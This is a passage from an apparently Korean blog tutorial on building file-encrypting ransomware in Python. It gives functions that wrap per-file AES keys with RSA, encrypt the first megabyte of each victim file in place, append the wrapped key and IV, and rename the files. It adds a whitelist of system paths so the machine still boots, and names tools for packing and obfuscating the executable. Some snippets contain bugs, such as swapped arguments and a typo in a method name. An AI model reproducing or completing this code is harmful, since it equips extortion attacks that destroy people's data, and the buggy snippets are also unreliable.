&#xD1B5;&#xD574; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xB2E4;.</li><li><code>rsaEncryptSecret(string, publicKey)</code>: public key&#xB97C; &#xAC00;&#xC9C0;&#xACE0; secret&#xC744; &#xBE44;&#xB300;&#xCE6D; &#xC554;&#xD638;&#xD654;&#xD55C;&#xB2E4;(private key&#xB97C; &#xD1B5;&#xD574;&#xC11C;&#xB9CC; &#xBCF5;&#xD638;&#xD654;&#xB428;). &#xC774;&#xB807;&#xAC8C; &#xD558;&#xBA74; &#xAC01; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD574; &#xC0DD;&#xC131;&#xB41C; &#xB300;&#xCE6D; &#xD0A4;&#xB97C; publicKey&#xB85C; &#xC554;&#xD638;&#xD654;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB294; &#xAC01; &#xD30C;&#xC77C;&#xC758; &#xB300;&#xCE6D; &#xD0A4;&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD558;&#xB824;&#xBA74; &#xC6B0;&#xB9AC;&#xC758; private key&#xAC00; &#xD544;&#xC694;&#xD558;&#xB2E4;.</li><li><code>rsaDecryptSecret(secret, privateKey)</code>: private &#xBE44;&#xB300;&#xCE6D; &#xD0A4;&#xB97C; &#xD1B5;&#xD574; &#xC554;&#xD638;&#xD654;&#xB41C; &#xB300;&#xCE6D;&#xD0A4;&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD55C;&#xB2E4;.</li><li><code>symEncryptFile(publicKey, file)</code>: &#xC554;&#xD638;&#xD654; &#xB85C;&#xC9C1;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xBBC0;&#xB85C; &#xAC00;&#xC7A5; &#xBCF5;&#xC7A1;&#xD55C; &#xBD80;&#xBD84;&#xC774;&#xB2E4;. &#xC544;&#xB798;&#xC5D0; &#xC790;&#xC138;&#xD788; &#xC124;&#xBA85;&#xD560; &#xAC70;&#xC9C0;&#xB9CC;, &#xC774;&#xB984;&#xC73C;&#xB85C; &#xBCFC; &#xC218; &#xC788;&#xB4EF;&#xC774; &#xD30C;&#xC77C;&#xC744; &#xC554;&#xD638;&#xD654;&#xD558;&#xB294; &#xD568;&#xC218;&#xB2E4;.</li><li><code>symDecryptFile(privateKey, file)</code>: &#xD30C;&#xC77C;&#xC744; &#xBCF5;&#xD638;&#xD654;&#xD55C;&#xB2E4;.</li><li><code>symEncryptDirectory(publicKey, dir)</code>: &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xBC1B;&#xC544;&#xC11C; &#xB0B4;&#xBD80;&#xC5D0; &#xC788;&#xB294; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC744; &#xAC00;&#xC838;&#xC628;&#xB2E4;. &#xADF8; &#xD6C4; <code>symEncryptFile</code>&#xB97C; &#xD638;&#xCD9C;&#xD55C;&#xB2E4;.</li><li><code>symDecryptDirectory(privateKey, dir)</code>: <code>symEncryptDirectory</code>&#xC640; &#xBE44;&#xC2B7;&#xD558;&#xC9C0;&#xB9CC; &#xBC18;&#xB300;&#xC758; &#xAE30;&#xB2A5;&#xC744; &#xD55C;&#xB2E4;.</li></ul><h1 id="rsaEncryptSecret"><a href="#rsaEncryptSecret" class="headerlink" title="rsaEncryptSecret"></a>rsaEncryptSecret</h1><p>RSA&#xB97C; &#xD1B5;&#xD574; secret key&#xB97C; &#xC554;&#xD638;&#xD654;&#xD560; &#xAC83;&#xC774;&#xB2E4;. RSA&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xB79C;&#xB364;&#xC131; &#xC5C6;&#xC774; &#xC554;&#xD638;&#xD654; &#xB418;&#xBBC0;&#xB85C; &#xAE30;&#xBCF8;&#xC801;&#xC778; RSA&#xC5D0; &#xB79C;&#xB364;&#xC131;&#xACFC; <a href="https://en.wikipedia.org/wiki/Trapdoor_function">one-way permutation trapdoor</a>&#xB97C; &#xCD94;&#xAC00;&#xD55C; padding scheme&#xC778; <a href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding">Optimal asymmetric encryption padding(OAEP)</a>&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xAC83;&#xC774;&#xB2E4;. OAEP&#xC640; &#xAC19;&#xC774; RSA&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xB54C; &#xACB0;&#xACFC; cypher &#xD06C;&#xAE30;&#xB294; modulus(<code>key size/8</code>)&#xACFC; &#xAC19;&#xC544;&#xC57C; &#xD55C;&#xB2E4;. 2048bit RSA&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBBC0;&#xB85C; 256 bytes&#xC758; resulting cyphertext&#xAC00; &#xB098;&#xC640;&#xC57C; &#xD55C;&#xB2E4;.</p><p>&#xC774;&#xC5D0; &#xB300;&#xD55C; &#xAC04;&#xB2E8;&#xD55C; &#xC608;&#xC81C; &#xCF54;&#xB4DC;&#xC774;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rsaEncryptSecret</span>(<span class="hljs-params">string, publicKey</span>):</span>  public_key = get_key(publicKey, <span class="hljs-literal">None</span>)  <span class="hljs-comment"># Create the cipher object</span>  cipher_rsa = PKCS1_OAEP.new(public_key)  <span class="hljs-comment"># We need to encode the string to work with bytes instead of chars</span>  bytestrings = str.encode(string)  cipher_text = cipher_rsa.encrypt(bytestrings)  <span class="hljs-comment">#At this point the cipher_text should be 256 bytes in length</span>  <span class="hljs-comment"># We&apos;ll base64 encode it for convenience</span>  <span class="hljs-comment"># Remember that a base64 string needs to be divisible by 3, so 256 bytes will become 258 with padding </span>  <span class="hljs-keyword">return</span> base64.b64encode(cipher_text)</code></pre><p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%203.png" alt></p><p>Source: <a href="https://stackoverflow.com/questions/13378815/base64-length-calculation">https://stackoverflow.com/questions/13378815/base64-length-calculation</a></p><h1 id="RsaDecryptSecret"><a href="#RsaDecryptSecret" class="headerlink" title="RsaDecryptSecret"></a>RsaDecryptSecret</h1><p>&#xC81C;&#xACF5;&#xB41C; secret key&#xB85C; cipher text&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD55C;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rsaDecryptSecret</span>(<span class="hljs-params">string, privateKey</span>):</span>  <span class="hljs-comment"># We firts import the private Key</span>  private_key = get_key(privateKey, <span class="hljs-literal">None</span>)  <span class="hljs-comment"># Decode the base64 encoded string</span>  base64DecodedSecret = base64.b64decode(string)  <span class="hljs-comment"># create the cipher object</span>  cipher_rsa = PKCS1_OAEP.new(private_key)  <span class="hljs-comment"># Decrypt the content</span>  decryptedBytestrings = cipher_rsa.decrypt(base64DecodedSecret)  <span class="hljs-comment"># Remember to convert the decoded cipher from bytes to string</span>  decryptedSecret = decryptedBytestrings.decode()  <span class="hljs-keyword">return</span> decryptedSecret</code></pre><h1 id="SymEncryptFile"><a href="#SymEncryptFile" class="headerlink" title="SymEncryptFile"></a>SymEncryptFile</h1><p>&#xC8FC;&#xC694; &#xC554;&#xD638;&#xD654; &#xD568;&#xC218;&#xC774;&#xBA70; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xB3D9;&#xC791;&#xD55C;&#xB2E4;.</p><ol><li><p>publicKey&#xC640; file path&#xB97C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD55C;&#xB2E4;.</p> <pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">symEncryptFile</span>(<span class="hljs-params">publicKey, file</span>):</span></code></pre></li><li><p>&#xD2B9;&#xC815; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; &#xB79C;&#xB364; &#xD0A4;&#xB97C; &#xC0DD;&#xC131;&#xD55C;&#xB2E4;.</p> <pre><code class="hljs python">key = generateKey()</code></pre></li><li><p>publicKey&#xB85C; &#xB79C;&#xB364; &#xD0A4;&#xB97C; &#xC554;&#xD638;&#xD654;&#xD55C;&#xB2E4;.</p> <pre><code class="hljs python">encryptedKey = rsaEncryptSecret(key, publicKey)</code></pre></li><li><p>&#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; &#xC554;&#xD638;&#xD654; &#xC0AC;&#xC774;&#xC988;(n byte)&#xB97C; &#xC815;&#xC758;&#xD55C;&#xB2E4;. &#xC608;&#xC2DC;&#xB85C; 1MB&#xB97C; &#xC0AC;&#xC6A9;&#xD55C;&#xB2E4;.</p> <pre><code class="hljs python">buffer_size = <span class="hljs-number">1048576</span></code></pre></li><li><p>&#xD30C;&#xC77C;&#xC774; &#xC774;&#xBBF8; &#xC554;&#xD638;&#xD654;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD55C;&#xB2E4;. &#xC774;&#xBBF8; &#xB418;&#xC5B4;&#xC788;&#xC744; &#xACBD;&#xC6B0; &#xBB34;&#xC2DC;&#xD55C;&#xB2E4;.</p> <pre><code class="hljs python"><span class="hljs-keyword">if</span> file.endswitch(<span class="hljs-string">&quot;.&quot;</span> + cryptoName):print(<span class="hljs-string">&apos;File is already encrypted, skipping&apos;</span>)<span class="hljs-keyword">return</span></code></pre></li><li><p>&#xD30C;&#xC77C;&#xC758; &#xCCAB; n &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xC554;&#xD638;&#xD654;&#xD558;&#xACE0; content&#xB97C; overwrite &#xD55C;&#xB2E4;.</p> <pre><code class="hljs python"><span class="hljs-comment"># Open the input and output files</span>input_file = open(file, <span class="hljs-string">&apos;r+b&apos;</span>)print(<span class="hljs-string">&quot;Encrypting file: &quot;</span>+ file)output_file = open(file + <span class="hljs-string">&apos;.&apos;</span> + cryptoName, <span class="hljs-string">&apos;w+b&apos;</span>)<span class="hljs-comment"># Create the cipher object and encrypt the data</span>cipher_encrypt = AES.new(key, AES.MODE_CFB)<span class="hljs-comment"># Encrypt file first</span>input_file.seek(<span class="hljs-number">0</span>)buffer = input_file.read(buffer_size)ciphered_bytes = cipher_encrypt.encrypt(buffer)input_file.seek(<span class="hljs-number">0</span>)input_file.write(ciphered_bytes)</code></pre><p> <img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%204.png" alt></p></li><li><p>&#xD30C;&#xC77C;&#xC758; &#xB05D;&#xC5D0; &#xC554;&#xD638;&#xD654;&#xB41C; &#xB79C;&#xB364; &#xD0A4;&#xB97C; &#xCD94;&#xAC00;&#xD55C;&#xB2E4;.</p> <pre><code class="hljs python">input_file.seek(<span class="hljs-number">0</span>, os.SEEK_END)input_file.write(encryptedKey.encode())</code></pre></li><li><p>&#xD30C;&#xC77C;&#xC758; &#xB05D;&#xC5D0; AES IV(initialization vector)&#xB97C; &#xCD94;&#xAC00;&#xD55C;&#xB2E4;.</p> <pre><code class="hljs python">input_file.seek(<span class="hljs-number">0</span>, os.SEEK_END)input_file.write(cipher_encrypt.iv)</code></pre></li><li><p>&#xC554;&#xD638;&#xD654;&#xAC00; &#xB41C; &#xC9C0; &#xC2DD;&#xBCC4;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC774;&#xB984;&#xC744; &#xBC14;&#xAFBC;&#xB2E4;.</p> <pre><code class="hljs python">input_file.close()  os.rename(file, file + <span class="hljs-string">&quot;.&quot;</span> + cryptoName)</code></pre></li></ol><p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%205.png" alt></p><blockquote><p>&#xC554;&#xD638;&#xD654; &#xD6C4; &#xB300;&#xB7B5;&#xC801;&#xC778; &#xD30C;&#xC77C; &#xAD6C;&#xC870;</p></blockquote><p>&#xC804;&#xCCB4; &#xD30C;&#xC77C;&#xC744; &#xBCF5;&#xC0AC;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC5C6;&#xC5C8;&#xB358; &#xAC83;&#xC744; &#xC0DD;&#xAC01;&#xD574;&#xB77C;. file object&#xB97C; &#xD1B5;&#xD574; <code>seek()</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xD0D0;&#xC0C9;&#xD558;&#xACE0; &#xBE60;&#xB974;&#xAC8C; &#xC791;&#xC5C5;&#xC744; &#xC9C4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xB294; &#xBCF5;&#xD638;&#xD654; &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB3C4; &#xC0AC;&#xC6A9;&#xB41C;&#xB2E4;.</p><p>&#xB610; &#xC554;&#xD638;&#xD654;&#xB41C; &#xD30C;&#xC77C;&#xC5D0; AES IV&#xC640; &#xC554;&#xD638;&#xD654;&#xB41C; &#xD0A4;&#xB97C; &#xBAA8;&#xB450; &#xCD94;&#xAC00;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xAC01; &#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; &#xD0A4;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xD14D;&#xC2A4;&#xD2B8; &#xD30C;&#xC77C;&#xC740; &#xD544;&#xC694; &#xC5C6;&#xB2E4;. victim&#xC740; &#xC6B0;&#xB9AC;&#xC5D0;&#xAC8C; &#xC5B4;&#xB5A4; &#xD30C;&#xC77C;&#xC774;&#xB4E0; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xACE0; &#xD2B9;&#xC815;&#xD55C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; private key&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xC73C;&#xBA74; &#xC6B0;&#xB9AC;&#xB294; &#xBCF5;&#xD638;&#xD654;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2021/04/25/idioth/arch_of_ransomware_part2/Untitled%206.png" alt></p><h1 id="SymDecryptFile"><a href="#SymDecryptFile" class="headerlink" title="SymDecryptFile"></a>SymDecryptFile</h1><p>&#xC8FC;&#xC694; &#xBCF5;&#xD638;&#xD654; &#xD568;&#xC218;&#xC774;&#xBA70; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xB3D9;&#xC791;&#xD55C;&#xB2E4;.</p><ol><li><p>privateKey&#xC640; file path&#xB97C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD55C;&#xB2E4;.</p> <pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">symDecryptFile</span>(<span class="hljs-params">privateKey, file</span>):</span></code></pre></li><li><p>&#xD30C;&#xC77C;&#xC5D0; &#xB300;&#xD55C; decryption size(n &#xBC14;&#xC774;&#xD2B8;, &#xC554;&#xD638;&#xD654;&#xC5D0;&#xC11C; &#xC4F4; &#xAC83;&#xACFC; &#xB3D9;&#xC77C;)&#xB97C; &#xC815;&#xC758;&#xD574;&#xB77C;. &#xC608;&#xC2DC;&#xB294; 1MB&#xC774;&#xB2E4;.</p> <pre><code class="hljs python">buffer_size = <span class="hljs-number">1048576</span></code></pre></li><li><p>&#xD655;&#xC7A5;&#xC790;&#xB97C; &#xD1B5;&#xD574; &#xC554;&#xD638;&#xD654; &#xC5EC;&#xBD80;&#xB97C; &#xD655;&#xC778;&#xD55C;&#xB2E4;.</p> <pre><code class="hljs python"><span class="hljs-keyword">if</span> file.endswith(<span class="hljs-string">&quot;.&quot;</span> + cryptoName):out_filename = file[:-(len(cryptoName) + <span class="hljs-number">1</span>)]print(<span class="hljs-string">&quot;Decrypting file: &quot;</span> + file)<span class="hljs-keyword">else</span> :print(<span class="hljs-string">&apos;File is not encrypted&apos;</span>)<span class="hljs-keyword">return</span></code></pre></li><li><p>&#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xC5B4; AES IV(&#xB9C8;&#xC9C0;&#xB9C9; 16&#xBC14;&#xC774;&#xD2B8;)&#xB97C; &#xC77D;&#xC5B4;&#xC628;&#xB2E4;.</p> <pre><code class="hljs python">input_file = open(file, <span class="hljs-string">&apos;r+b&apos;</span>)<span class="hljs-comment"># Read in the iv</span>input_file.seek(<span class="hljs-number">-16</span>, os.SEEK_END)iv = input_file.read(<span class="hljs-number">16</span>)</code></pre></li><li><p>&#xC554;&#xD638;&#xD654;&#xB41C; &#xBCF5;&#xD638;&#xD654; &#xD0A4;&#xB97C; &#xC77D;&#xC5B4;&#xC628;&#xB2E4;.</p> <pre><code class="hljs python"><span class="hljs-comment"># we move the pointer to 274 bbytes before the end of file</span><span class="hljs-comment"># (258 bytes of the encryption key + 16 of the AES IV)</span>input_file.seek(<span class="hljs-number">-274</span>, os.SEEK_END)<span class="hljs-comment"># And we read the 258 bytes of the key</span>secret = input_file.read(<span class="hljs-number">258</span>)</code></pre></li><li><p>private key&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC554;&#xD638;&#xD654;&#xB41C; &#xD0A4;&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD55C;&#xB2E4;.</p> <pre><code class="hljs python">key = rsaDecryptSecret(cert, secret)</code></pre></li><li><p>&#xC774;&#xC804;&#xC5D0; &#xC815;&#xC758;&#xD55C; aes-encrypted buffer size&#xB97C; &#xBCF5;&#xD638;&#xD654;&#xD558;&#xACE0; &#xD30C;&#xC77C;&#xC758; &#xCCAB; &#xBD80;&#xBD84;&#xC5D0; &#xC791;&#xC131;&#xD55C;&#xB2E4;.</p> <pre><code class="hljs python"><span class="hljs-comment"># Create the cipher object</span>cipher_encrypt = AES.new(privateKey, AES.MODE_CFB, iv=iv)<span class="hljs-comment"># Read the encrypted header</span>input_file.seek(<span class="hljs-number">0</span>)buffer = input_file.read(buffer_size)<span class="hljs-comment"># Decrypt the header with the key</span>decrypted_bytes = cipher_encrypt.decrypt(buffer)<span class="hljs-comment"># Write the decrypted text on the same file</span>input_file.seek(<span class="hljs-number">0</span>)input_file.write(decrypted_bytes)</code></pre></li><li><p>&#xD30C;&#xC77C;&#xC758; &#xB05D; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; IV&#xC640; &#xC554;&#xD638;&#xD654;&#xB41C; &#xD0A4;&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xACE0; &#xC774;&#xB984;&#xC744; &#xBCC0;&#xACBD;&#xD55C;&#xB2E4;.</p> <pre><code class="hljs python"><span class="hljs-comment"># Delete the last 274 bytes from IV + key.</span>input_file.seek(<span class="hljs-number">-274</span>, os.SEEK_END)input_file.truncate()input_file.close()<span class="hljs-comment"># Rename the file to delete the encrypted extenstion</span>os.rename(file, out_filename)</code></pre></li></ol><h1 id="&#xB9C8;&#xC9C0;&#xB9C9;-&#xACE0;&#xB824;&#xC0AC;&#xD56D;"><a href="#&#xB9C8;&#xC9C0;&#xB9C9;-&#xACE0;&#xB824;&#xC0AC;&#xD56D;" class="headerlink" title="&#xB9C8;&#xC9C0;&#xB9C9; &#xACE0;&#xB824;&#xC0AC;&#xD56D;"></a>&#xB9C8;&#xC9C0;&#xB9C9; &#xACE0;&#xB824;&#xC0AC;&#xD56D;</h1><p>&#xBAA8;&#xB4E0; &#xD568;&#xC218; &#xC791;&#xC131;&#xC774; &#xB05D;&#xB098;&#xBA74; &#xC120;&#xD0DD;&#xD55C; &#xD3F4;&#xB354;&#xB97C; &#xC554;&#xD638;&#xD654;&#xD558;&#xAC70;&#xB098; &#xBCF5;&#xD638;&#xD654;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xB2E4;. &#xC815;&#xD655;&#xD558;&#xAC8C; <code>symEncryptDirectory/symDecryptDirectory</code> &#xD568;&#xC218;&#xB97C; &#xCF54;&#xB529;&#xD588;&#xC73C;&#xBA74; &#xC554;&#xD638;&#xD654;, &#xBCF5;&#xD638;&#xD654; &#xC911; &#xD558;&#xB098;&#xB97C; &#xC120;&#xD0DD;&#xD55C; &#xD6C4; <code>.pem</code> &#xD30C;&#xC77C;&#xC744; &#xC804;&#xB2EC;&#xD558;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xB41C;&#xB2E4;. main &#xD638;&#xCD9C; &#xC804;&#xC5D0; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xC774;&#xAC83;&#xACFC; &#xBE44;&#xC2B7;&#xD55C; &#xAC83;&#xC774; &#xC788;&#xC744; &#xAC83;&#xC774;&#xB2E4;</p><pre><code class="hljs python">parser = argparse.ArgumentParser()parser.add_argument(<span class="hljs-string">&quot;--dest&quot;</span>, <span class="hljs-string">&quot;-d&quot;</span>, help=<span class="hljs-string">&quot;File or directory to encrypt/decrypt&quot;</span>, dest=<span class="hljs-string">&quot;destination&quot;</span>, default=<span class="hljs-string">&quot;none&quot;</span>, required=<span class="hljs-literal">True</span>)parser.add_argument(<span class="hljs-string">&quot;--action&quot;</span>, <span class="hljs-string">&quot;-a&quot;</span>, help=<span class="hljs-string">&quot;Action (encrypt/decrypt)&quot;</span>, dest=<span class="hljs-string">&quot;action&quot;</span>, required=<span class="hljs-literal">True</span>) parser.add_argument(<span class="hljs-string">&quot;--pem&quot;</span>,<span class="hljs-string">&quot;-p&quot;</span>, help=<span class="hljs-string">&quot;Public/Private key&quot;</span>, dest=<span class="hljs-string">&quot;key&quot;</span>, required=<span class="hljs-literal">True</span>)</code></pre><p>&#xC624;&#xB958; &#xAC80;&#xC0AC;(&#xC554;&#xD638;&#xD654; &#xC791;&#xC5C5;&#xC5D0; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB85C; public key&#xAC00; &#xC804;&#xB2EC;&#xB418;&#xB294;&#xC9C0;, decrypt&#xC5D0; private key&#xAC00; &#xC788;&#xB294;&#xC9C0; &#xB4F1;) &#xC678;&#xC5D0;&#xB3C4; &#xC6B4;&#xC601; &#xCCB4;&#xC81C;&#xC5D0; &#xB300;&#xD55C; &#xD30C;&#xC77C; &#xBC0F; &#xD3F4;&#xB354;&#xB97C; &#xD654;&#xC774;&#xD2B8; &#xB9AC;&#xC2A4;&#xD2B8;&#xB85C; &#xC9C0;&#xC815;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xC554;&#xD638;&#xD654;&#xB418;&#xB354;&#xB77C;&#xB3C4; &#xCEF4;&#xD4E8;&#xD130;&#xB294; &#xC0AC;&#xC6A9;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xB3C4;&#xB85D; &#xD574;&#xC57C; &#xD55C;&#xB2E4;. &#xBAA8;&#xB4E0; &#xD30C;&#xC77C;&#xC744; &#xC554;&#xD638;&#xD654;&#xD55C;&#xB2E4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xACB0;&#xACFC;&#xB97C; &#xBCFC; &#xC218; &#xC788;&#xB2E4;.</p><ol><li>&#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xBB54;&#xAC00; &#xC798;&#xBABB;&#xB41C; &#xAC78; &#xC54C; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xCEF4;&#xD4E8;&#xD130; &#xC0AC;&#xC6A9;&#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD574;&#xC9C4;&#xB2E4;.</li><li>&#xC804;&#xBD80; &#xC554;&#xD638;&#xD654;&#xB41C; &#xD6C4;, &#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#xBD80;&#xD305;&#xC774; &#xC548;&#xB418;&#xACE0; &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xC5D0; &#xAC10;&#xC5FC;&#xB41C; &#xC0AC;&#xC2E4;&#xC744; &#xC54C;&#xC9C0; &#xBABB;&#xD55C;&#xB2E4;.</li></ol><p>&#xC608;&#xC2DC;&#xB85C; &#xB9AC;&#xB205;&#xC2A4; &#xD654;&#xC774;&#xD2B8; &#xB9AC;&#xC2A4;&#xD2B8;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><pre><code class="hljs ini"><span class="hljs-attr">whitelist</span> = [<span class="hljs-string">&quot;/etc/ssh&quot;</span>, <span class="hljs-string">&quot;/etc/pam.d&quot;</span>, <span class="hljs-string">&quot;/etc/security/&quot;</span>, <span class="hljs-string">&quot;/boot&quot;</span>,<span class="hljs-string">&quot;/run&quot;</span>, <span class="hljs-string">&quot;/usr&quot;</span>, <span class="hljs-string">&quot;/snap&quot;</span>, <span class="hljs-string">&quot;/var&quot;</span>, <span class="hljs-string">&quot;/sys&quot;</span>, <span class="hljs-string">&quot;/proc&quot;</span>, <span class="hljs-string">&quot;/dev&quot;</span>, <span class="hljs-string">&quot;/bin&quot;</span>,<span class="hljs-string">&quot;/sbin&quot;</span>, <span class="hljs-string">&quot;/lib&quot;</span>, <span class="hljs-string">&quot;passwd&quot;</span>, <span class="hljs-string">&quot;shadow&quot;</span>, <span class="hljs-string">&quot;known_hosts&quot;</span>, <span class="hljs-string">&quot;sshd_config&quot;</span>,<span class="hljs-string">&quot;/home/sec/.viminfo&quot;</span>, <span class="hljs-string">&apos;/etc/crontab&apos;</span>, <span class="hljs-string">&quot;/etc/default/locale&quot;</span>, <span class="hljs-string">&quot;/etc/environment&quot;</span>]</code></pre><p><code>.py</code> &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xBAA8;&#xB4E0; dependency&#xC640; &#xD568;&#xAED8; &#xC555;&#xCD95;&#xD558;&#xC5EC; &#xB2E8;&#xC77C; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xB85C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xB2E4;. &#xC77C;&#xC77C;&#xC774; &#xC54C;&#xB824;&#xC8FC;&#xC9C4; &#xC54A;&#xACA0;&#xC9C0;&#xB9CC; <a href="https://pypi.org/project/pyarmor/">pyarmor</a>&#xC640; <a href="https://www.pyinstaller.org/">pyinstaller</a>&#xB97C; &#xCC3E;&#xC544;&#xBCF4;&#xBA74; &#xB41C;&#xB2E4;. &#xB610; &#xC0AC;&#xC6A9;&#xD558;&#xB824;&#xB294; &#xB09C;&#xB3C5;&#xD654;&#xC5D0; &#xB530;&#xB77C;&#xC11C; <a href="https://github.com/Nuitka/Nuitka">Nuitka</a>&#xAC00; &#xB3C4;&#xC6C0;&#xC774; &#xB420; &#xC218;&#xB3C4; &#xC788;&#xB2E4;.</p><h1 id="&#xB2E4;&#xB978;-&#xC885;&#xB958;&#xC758;-&#xB79C;&#xC12C;&#xC6E8;&#xC5B4;-MBR-&#xC554;&#xD638;&#xD654;"><a href="#&#xB2E4;&#xB978;-&#xC885;&#xB958;&#xC758;-&#xB79C;&#xC12C;&#xC6E8;&#xC5B4;-MBR-&#xC554;&#xD638;&#xD654;" class="headerlink" title="&#xB2E4;&#xB978; &#xC885;&#xB958;&#xC758; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;(MBR &#xC554;&#xD638;&#xD654;)"></a>&#xB2E4;&#xB978; &#xC885;&#xB958;&#xC758; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;(MBR &#xC554;&#xD638;&#xD654;)</h1><p>&#xC6B0;&#xB9AC;&#xAC00; &#xC0B4;&#xD3B4;&#xBCF4;&#xC9C0; &#xC54A;&#xC740; &#xB4DC;&#xB77C;&#xC774;&#xBE0C;&#xC758; <a href="https://en.wikipedia.org/wiki/Master_boot_record">Master Boot Record</a>&#xB97C; &#xAC10;&#xC5FC;&#xC2DC;&#xD0A4;&#xB294; &#xB2E4;&#xB978; &#xC885;&#xB958;&#xC758; &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xAC00; &#xC788;&#xB2E4;. &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; NTFS &#xD30C;&#xC77C; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xC554;&#xD638;&#xD654;&#xD558;&#xB294; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xB514;&#xC2A4;&#xD06C;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC5C6;&#xAC8C; &#xB9CC;&#xB4E0;&#xB2E4;. &#xC774; &#xBC29;&#xBC95;&#xC740; &#xB370;&#xC774;&#xD130;&#xC758; &#xC791;&#xC740; &#xBD80;&#xBD84;&#xB9CC; &#xC554;&#xD638;&#xD654;&#xD558;&#xBA74; &#xB3FC;&#xC11C; &#xB9E4;&#xC6B0; &#xBE60;&#xB974;&#xB2E4;. <a href="https://en.wikipedia.org/wiki/Petya_(malware">Petya &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;</a>)&#xAC00; &#xC774; &#xC885;&#xB958;&#xC758; &#xC644;&#xBCBD;&#xD55C; &#xC608;&#xC2DC;&#xC774;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xB294; 3&#xAC1C;&#xC758; &#xC8FC;&#xC694;&#xD55C; &#xB2E8;&#xC810;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB2E4;.</p><p>&#xCCAB; &#xBC88;&#xC9F8;&#xB85C; OS&#xB97C; &#xBD80;&#xD305;&#xD560; &#xC218; 